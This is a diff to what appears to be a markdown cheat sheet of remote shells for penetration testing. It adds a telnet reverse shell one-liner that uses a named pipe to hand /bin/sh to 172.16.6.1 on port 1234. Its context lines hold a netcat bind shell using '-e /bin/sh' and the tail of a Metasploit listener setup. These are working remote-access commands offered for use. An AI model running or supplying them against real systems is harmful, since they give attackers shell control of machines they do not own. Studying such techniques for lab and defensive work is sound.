@@ -52,12 +52,17 @@
 `set LPORT 1234`
 `run`
 
+#### Reverse shell over the Telnet Protocol
+`mknod a p; telnet 172.16.6.1 1234 0<a | /bin/sh 1>a`
+- This reverse shell makes a special character file (mknod) uses telnet to call back and direct standard output to the character file via the binary /bin/sh
+
 ### Bind Shells
 #### Netcat Bind Shell
 `nc -nlvp 1234 -e /bin/sh`
 - This is executed on the target box and waits for an incoming connection
 `nc [target box ip] 1234` 
 - This is executed on your attack box to connect to the listener on the target
+
 
 
 
